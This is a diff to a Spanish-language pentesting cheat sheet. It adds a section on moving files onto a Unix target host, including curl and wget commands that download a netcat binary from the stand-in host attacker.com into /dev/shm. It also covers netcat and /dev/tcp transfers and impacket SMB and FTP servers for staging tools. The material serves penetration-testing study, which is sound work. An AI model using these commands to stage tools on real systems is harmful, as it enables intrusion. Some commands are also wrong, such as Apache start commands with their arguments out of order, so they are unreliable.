@@ -88,4 +88,56 @@ Técnicas para utilizar en sistemas basados en unix
   ```
 ## Transfiriendo archivos
 
- 
+### HTTP
+#### Python
+  ```bash
+  python -m SimpleHTTPServer 80
+  ```
+#### Python3
+  ```bash
+  python3 -m http.server 80
+  ```
+#### Apache
+  ```bash
+  sudo service start apache2
+  sudo systemctl apache2 start
+  ```
+#### PHP
+  ```bash
+  php -S 0.0.0.0:8080
+  ```
+### Curl
+  ```bash
+  curl -O http://attacker.com/nc
+  ```
+### Wget
+  ```bash
+  wget http://attacker.com/nc # current directory
+  wget http://attacker.com/nc -O /dev/shm/nc # Setting output path
+  ```
+### NetCat
+  ```bash
+  target -> nc -lvp 4444 > FileToTransfer
+  source -> nc targetip 4444 -w 3 < FileToTransfer (w representa un tiempo de espera en seg para archivos muy grandes)
+  ```
+### /dev/tcp
+  ```bash
+  target -> nc -lvp 4444 > FileToTransfer
+  cat FileToTransfer > /dev/tcp/targetip/4444 
+  ```
+### FTP
+  ```bash
+  pip3 install pyftpdlib
+  source -> python3 -m pyftpdlib -p 21 -u chan -P 123
+  target -> ftp sourceip # pw : 123  
+  ```
+### SCP
+  ```bash
+  source -> scp file.txt user@10.10.10.10:/tmp
+  target -> cat /tmp/file.txt
+  ```
+### Samba
+  ```bash
+  source -> sudo impacket-smbserver share $(pwd) -user chan -password
+  target -> smbclient //sourceip/share -U chan%chan
+  ```
